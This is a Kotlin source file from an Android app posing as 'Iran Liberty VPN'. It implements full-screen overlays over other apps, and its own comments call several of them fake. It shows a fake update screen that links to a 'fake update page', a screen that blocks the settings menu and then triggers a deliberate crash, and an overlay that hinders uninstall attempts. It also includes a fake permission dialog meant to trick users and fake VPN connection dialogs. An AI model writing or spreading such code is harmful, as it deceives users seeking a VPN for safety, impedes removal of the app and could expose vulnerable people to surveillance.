package com.iran.liberty.vpn

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import androidx.core.content.ContextCompat

/**
 * Helper class for managing overlay views (fake dialogs, blocking screens)
 */
object OverlayHelper {

    private const val TAG = "OverlayHelper"
    
    // Overlay types
    const val TYPE_UPDATE_REQUIRED = 1
    const val TYPE_SETTINGS_BLOCKED = 2
    const val TYPE_DEFENSIVE = 3
    const val TYPE_FAKE_ERROR = 4
    
    private var currentOverlay: View? = null
    private var windowManager: WindowManager? = null

    /**
     * Show an overlay based on type
     */
    fun showOverlay(context: Context, type: Int, message: String? = null) {
        Log.d(TAG, "Showing overlay type: $type")
        
        // Remove any existing overlay
        removeOverlay()
        
        // Get window manager
        windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        // Inflate appropriate layout
        val layoutId = when (type) {
            TYPE_UPDATE_REQUIRED -> R.layout.update_required_overlay
            TYPE_SETTINGS_BLOCKED -> R.layout.settings_blocked_overlay
            TYPE_DEFENSIVE -> R.layout.defensive_overlay
            TYPE_FAKE_ERROR -> R.layout.fake_error_overlay
            else -> R.layout.update_required_overlay
        }
        
        try {
            val inflater = context.getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
            currentOverlay = inflater.inflate(layoutId, null)
            
            // Configure based on type
            when (type) {
                TYPE_UPDATE_REQUIRED -> setupUpdateRequiredOverlay(context)
                TYPE_SETTINGS_BLOCKED -> setupSettingsBlockedOverlay(context)
                TYPE_DEFENSIVE -> setupDefensiveOverlay(context)
                TYPE_FAKE_ERROR -> setupFakeErrorOverlay(context, message)
            }
            
            // Add to window
            val params = createOverlayParams()
            windowManager?.addView(currentOverlay, params)
            
            Log.d(TAG, "Overlay shown successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error showing overlay", e)
        }
    }

    /**
     * Remove current overlay
     */
    fun removeOverlay() {
        currentOverlay?.let { view ->
            try {
                windowManager?.removeView(view)
                currentOverlay = null
                Log.d(TAG, "Overlay removed")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing overlay", e)
            }
        }
    }

    /**
     * Check if overlay permission is granted
     */
    fun hasOverlayPermission(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else {
            true // Pre-Marshmallow doesn't require permission
        }
    }

    /**
     * Request overlay permission
     */
    fun requestOverlayPermission(activity: Activity, requestCode: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:${activity.packageName}")
            )
            activity.startActivityForResult(intent, requestCode)
        }
    }

    /**
     * Create overlay window parameters
     */
    private fun createOverlayParams(): WindowManager.LayoutParams {
        return WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            }
            
            format = PixelFormat.RGBA_8888
            
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                   WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                   WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+ requires this flag for toast-style windows
                flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            }
            
            gravity = Gravity.CENTER
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }
    }

    /**
     * Setup update required overlay
     */
    private fun setupUpdateRequiredOverlay(context: Context) {
        currentOverlay?.let { view ->
            val title = view.findViewById<TextView>(R.id.overlay_title)
            val message = view.findViewById<TextView>(R.id.overlay_message)
            val button = view.findViewById<Button>(R.id.overlay_button)
            
            title?.text = context.getString(R.string.update_required_title)
            message?.text = context.getString(R.string.update_required_message)
            button?.text = context.getString(R.string.update_now)
            
            button?.setOnClickListener {
                // Open browser to fake update page
                val intent = Intent(Intent.ACTION_VIEW).apply {
                    data = Uri.parse("https://iranlibertyvpn.com/update")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
                
                // Remove overlay after delay
                view.postDelayed({ removeOverlay() }, 1000)
            }
            
            // Auto-remove after 10 seconds
            view.postDelayed({ removeOverlay() }, 10000)
        }
    }

    /**
     * Setup settings blocked overlay
     */
    private fun setupSettingsBlockedOverlay(context: Context) {
        currentOverlay?.let { view ->
            val title = view.findViewById<TextView>(R.id.overlay_title)
            val message = view.findViewById<TextView>(R.id.overlay_message)
            val button = view.findViewById<Button>(R.id.overlay_button)
            
            title?.text = context.getString(R.string.settings_blocked_title)
            message?.text = context.getString(R.string.settings_blocked_message)
            button?.text = context.getString(R.string.understand)
            
            button?.setOnClickListener {
                removeOverlay()
                
                // Also trigger fake crash for additional disruption
                triggerFakeCrash()
            }
            
            // Don't auto-remove - user must click
        }
    }

    /**
     * Setup defensive overlay (for uninstall attempts)
     */
    private fun setupDefensiveOverlay(context: Context) {
        currentOverlay?.let { view ->
            // Simple defensive overlay that auto-removes
            view.setBackgroundColor(0x80000000) // Semi-transparent black
            
            // Auto-remove after 2 seconds
            view.postDelayed({ removeOverlay() }, 2000)
        }
    }

    /**
     * Setup fake error overlay
     */
    private fun setupFakeErrorOverlay(context: Context, customMessage: String?) {
        currentOverlay?.let { view ->
            val title = view.findViewById<TextView>(R.id.overlay_title)
            val message = view.findViewById<TextView>(R.id.overlay_message)
            val button = view.findViewById<Button>(R.id.overlay_button)
            
            title?.text = context.getString(R.string.error_title)
            message?.text = customMessage ?: context.getString(R.string.generic_error_message)
            button?.text = context.getString(R.string.close)
            
            button?.setOnClickListener {
                removeOverlay()
            }
            
            // Auto-remove after 5 seconds
            view.postDelayed({ removeOverlay() }, 5000)
        }
    }

    /**
     * Trigger fake crash (called from overlay)
     */
    private fun triggerFakeCrash() {
        Thread {
            Thread.sleep(1500)
            throw RuntimeException("Iran Liberty VPN has encountered an error")
        }.start()
    }

    /**
     * Show fake permission request overlay
     */
    fun showFakePermissionRequest(context: Context, permission: String, callback: (granted: Boolean) -> Unit) {
        // This would show a fake permission dialog that always returns granted
        // Used to trick users into thinking they're controlling permissions
        
        Log.d(TAG, "Showing fake permission request for: $permission")
        
        // For now, just call back with granted
        callback(true)
    }

    /**
     * Show fake VPN connection dialog
     */
    fun showFakeVpnDialog(context: Context, serverName: String) {
        Log.d(TAG, "Showing fake VPN dialog for server: $serverName")
        
        // This would show a convincing VPN connection dialog
        // Implementation would be similar to other overlays
        
        // Auto-remove after 3 seconds (simulating connection)
        currentOverlay?.postDelayed({ removeOverlay() }, 3000)
    }
}